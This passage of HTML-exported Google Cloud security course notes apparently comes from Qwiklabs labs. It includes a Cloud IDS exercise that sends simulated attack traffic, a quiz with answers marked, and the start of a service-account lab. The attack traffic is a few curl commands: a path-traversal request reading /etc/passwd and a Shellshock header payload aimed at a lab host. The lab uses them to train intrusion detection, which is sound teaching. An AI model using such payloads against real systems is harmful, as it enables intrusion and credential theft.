http://192.168.10.20/eicar.file</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>High Severity:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Critical Severity:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Exit the attacker virtual machine shell and return to Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='task-8-review-threats-detected-by-cloud-ids-2'><span>Task 8. Review threats detected by Cloud IDS</span></h4><p><span>In this task, you review the various attack traffic captured by the Cloud IDS in the Cloud console. The captured attack traffic profiles provide details of each threat.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>Network Security &gt; Cloud IDS</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Threats</span></strong><span> tab.</span></p></li></ol><p><span>The Cloud IDS captured various attack traffic profiles and provided the details on each threat. You may need to click </span><strong><span>Refresh</span></strong><span> if you do not see any threats. You now dive a little deeper and view threat details.</span></p><ol start='' ><li><p><span>Locate the </span><strong><span>Bash Remote Code Execution Vulnerability</span></strong><span> threat, click </span><strong><span>More</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D" referrerpolicy="no-referrer" alt="More Button"><span>), and then select </span><strong><span>View threat details</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You may have noticed that there are multiple threats that produce the same name, for example, “Bash Remote Code Execution Vulnerability”. This is expected behavior.</span></p><p>&nbsp;</p><p><span>If you look closely, you will see that the session IDs of the threats are different. Since both VMs created are in the same subnet, we are seeing mirrored packets for both the client and server. Outbound packets from the client are being mirrored to IDS, and additionally, inbound packets to the server are being mirrored to IDS.</span></p><ol start='' ><li><p><span>Now you view the details of this incident in Cloud Logging. To return to the </span><strong><span>Threats</span></strong><span> page, click the left arrow.</span></p></li><li><p><span>Click the </span><strong><span>Threats</span></strong><span> tab.</span></p></li><li><p><span>Locate the </span><strong><span>Bash Remote Code Execution Vulnerability</span></strong><span>, click </span><strong><span>More</span></strong><span>, and then select </span><strong><span>View threat logs</span></strong><span>.</span></p></li></ol><p><span>A new Cloud Logging tab opens that displays the same details. This enables you to send the logs to Cloud Storage, Chronicle, or any SIEM/SOAR. You can also create custom workflows to take remediation action based on alerts, like creating a Cloud Function that triggers on an alert and creating or updating a firewall rule to block the IP address, or creating or updating a Google Cloud Armor policy.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Getting Started with Cloud IDS.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='congratulations-10'><span>Congratulations!</span></h4><p><span>In this lab, you did the following:</span></p><ol start='' ><li><p><span>Created a new VPC and deployed a Cloud IDS endpoint.</span></p></li><li><p><span>Deployed two VMs, created a packet mirroring policy, and then sent attack traffic.</span></p></li><li><p><span>Verified that the Cloud IDS captured the threats by viewing the threat details in the Cloud console and the threat logs in Cloud Logging.</span></p></li></ol><h3 id='quiz-18'><span>Quiz</span></h3><p>&nbsp;</p><ol start='' ><li><p><span>Which ONE of the following statements is TRUE when discussing the SSL capabilities of Google Cloud Load Balancer?</span></p></li></ol><ul><li><p><strong><span>The Google-managed profile, COMPATIBLE, allows clients which support out-of-date SSL features.</span></strong></p></li><li><p><span>You must use one of the 3 pre-configured “Google-managed profiles” to specify the level of compatibility appropriate for your application.</span></p></li><li><p><span>Google Cloud Load Balancers require, and will only accept, a Google-managed SSL Cert.</span></p></li><li><p><span>If no SSL policy is set, the SSL policy is automatically set to the most constrained policy, which is RESTRICTED.</span></p></li></ul><p><span>Correct! The other two profiles, MODERN and RESTRICTED allow you to restrict SSL usage to clients with modern capabilities, or to restrict SSL access even further to meet compliance requirements.</span></p><ol start='2' ><li><p><span>Which FOUR of the following are firewall rule parameters?</span></p></li></ol><ul><li><p><span>Timestamp</span></p></li><li><p><strong><span>Direction</span></strong></p></li><li><p><strong><span>Source</span></strong></p></li><li><p><strong><span>Action</span></strong></p></li><li><p><strong><span>IP Address</span></strong></p></li><li><p><span>Organization</span></p></li><li><p><span>Project</span></p><p>&nbsp;</p></li></ul><ol start='3' ><li><p><span>Which statement about VPC Service Controls is false?</span></p></li></ol><ul><li><p><span>VPC Service Controls protect resources within a perimeter so they can only be privately accessed from clients within authorized VPC networks.</span></p></li><li><p><span>VPC Service Controls restrict Internet access to resources within a perimeter using allowlisted IPv4 and IPv6 ranges.</span></p></li><li><p><span>VPC Service Controls prevent data from being copied to unauthorized resources outside the perimeter using service operations.</span></p></li><li><p><strong><span>VPC Service Controls restrict Internet access to resources within a perimeter by checking permissions assigned to Cloud Identity and Active Directory accounts only.</span></strong></p></li></ul><p><span>Correct! Perimeters are checked against allowlisted IPv4 or IPv6 ranges, not against accounts.</span></p><ol start='4' ><li><p><span>Which TWO of the following statements about VPCs is TRUE?</span></p></li></ol><ul><li><p><span>Google Cloud Firewall allows rules by default only affect traffic flowing in one direction.</span></p></li><li><p><span>A connection is considered active if it has at least one packet sent over a one hour period.</span></p></li><li><p><strong><span>VPC firewall rules in Google Cloud are global in scope.</span></strong></p><p><span>Correct! Since VPC networks can be global in Google Cloud, firewall rules are also global.</span></p></li><li><p><strong><span>Every VPC network functions as a distributed firewall where firewall rules are defined at the network level.</span></strong></p><p><span>Correct! Google Cloud firewall rules exist not only between your instances and other networks, but also between individual instances within the same network.</span></p></li></ul><p>&nbsp;</p><h1 id='10-security-best-practices-in-google-cloud'><span>10 Security Best Practices in Google Cloud</span></h1><p>&nbsp;</p><h2 id='securing-compute-engine-techniques-and-best-practices'><span>Securing Compute Engine: Techniques and Best Practices</span></h2><p>&nbsp;</p><h3 id='lab---configuring-using-and-auditing-vm-service-accounts-and-scopes'><span>LAB - Configuring, Using, and Auditing VM Service Accounts and Scopes</span></h3><p>&nbsp;</p><h4 id='overview-13'><span>Overview</span></h4><p><a href='https://cloud.google.com/iam/docs/service-accounts'><span>Service accounts</span></a><span> are a special type of Google account that grant permissions to virtual machines instead of end users. Service accounts are primarily used to ensure safe, managed connections to APIs and Google Cloud services. Granting access to trusted connections and rejecting malicious ones is a must-have security feature for any Google Cloud project.</span></p><h5 id='objectives-10'><span>Objectives</span></h5><p><span>In this lab, you will learn how to:</span></p><ul><li><p><span>Create and manage service accounts.</span></p></li><li><p><span>Create a virtual machine and associate it with a service account.</span></p></li><li><p><span>Use client libraries to access BigQuery from a service account.</span></p></li><li><p><span>Run a query on a BigQuery public dataset from a Compute Engine instance.</span></p></li></ul><h4 id='setup-and-requirements-10'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h5 id='activate-google-cloud-shell-7'><span>Activate Google Cloud Shell</span></h5><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="images\hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - &lt;myaccount&gt;@&lt;mydomain&gt;.com (active)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/mydomain&gt;&lt;/myaccount&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = &lt;project_id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project_id&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><h5 id='what-are-service-accounts'><span>What are service accounts?</span></h5><p><span>A service account is a special Google account that belongs to your application or a </span><a href='https://cloud.google.com/compute/docs/instances/'><span>virtual machine</span></a><span> (VM) instead of an individual end user. Your application uses the service account to </span><a href='https://developers.google.com/identity/protocols/OAuth2ServiceAccount#authorizingrequests'><span>call the Google API of a service</span></a><span>, so that the users aren&#39;t directly involved.</span></p><p><span>For example, a Compute Engine VM may run as a service account and that account can be given permissions to access the resources it needs. This way the service account is the identity of the service, and the service account&#39;s permissions control which resources the service can access.</span></p><p><span>A service account is identified by its email address, which is unique to the account.</span></p><h5 id='types-of-service-accounts'><span>Types of service accounts</span></h5><h4 id='user-managed-service-accounts'><span>User-managed service accounts</span></h4><p><span>When you create a new Cloud project using the Cloud Console, if the Compute Engine API is enabled for your project, a Compute Engine service account is created for you by default. It is identifiable using the email: </span><code>PROJECT_NUMBER-compute@developer.gserviceaccount.com</code><span>.</span></p><p><span>If your project contains an App Engine application, the default App Engine service account is created in your project by default. It is identifiable using the email: </span><code>PROJECT_ID@appspot.gserviceaccount.com</code><span>.</span></p><h4 id='google-managed-service-accounts'><span>Google-managed service accounts</span></h4><p><span>In addition to the user-managed service accounts, you might see some additional service accounts in your project’s IAM policy or in the Cloud Console. These service accounts are created and owned by Google. These accounts represent different Google services and each account is automatically granted IAM roles to access your Google Cloud project.</span></p><h4 id='google-api-service-accounts'><span>Google API service accounts</span></h4><p><span>An example of a Google-managed service account is a Google API service account identifiable using the email: </span><code>PROJECT_NUMBER@cloudservices.gserviceaccount.com</code><span>.</span></p><p><span>This service account is designed specifically to run internal Google processes on your behalf and is not listed in the </span><strong><span>Service Accounts</span></strong><span> section of the Cloud Console. By default, the account is automatically granted the project editor role on the project and is listed in the </span><strong><span>IAM</span></strong><span> section of the Cloud Console.</span></p><p><span>This service account is deleted only when the project is deleted. Google services rely on the account having access to your project, so you should not remove or change the service account’s role on your project.</span></p><h4 id='task-1-create-and-manage-service-accounts'><span>Task 1. Create and manage service accounts</span></h4><p><span>In this task, you create and manage service accounts.</span></p><p><span>By default, you can create up to 100 user-managed service accounts in a project. If this quota does not meet your needs, you can use the Cloud console to request a quota increase.</span></p><p><strong><span>Note:</span></strong><span> The default service accounts described on this page do not count toward this quota.</span></p><h5 id='creating-a-service-account'><span>Creating a service account</span></h5><p><span>Creating a service account is similar to adding a member to your project, but the service account belongs to your applications rather than an individual end user.</span></p><ul><li><p><span>To create a service account, run the following command in Cloud Shell:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam service-accounts create my-sa-123 --display-name "my service account"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output of this command is the service account, which will look similar to the following.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 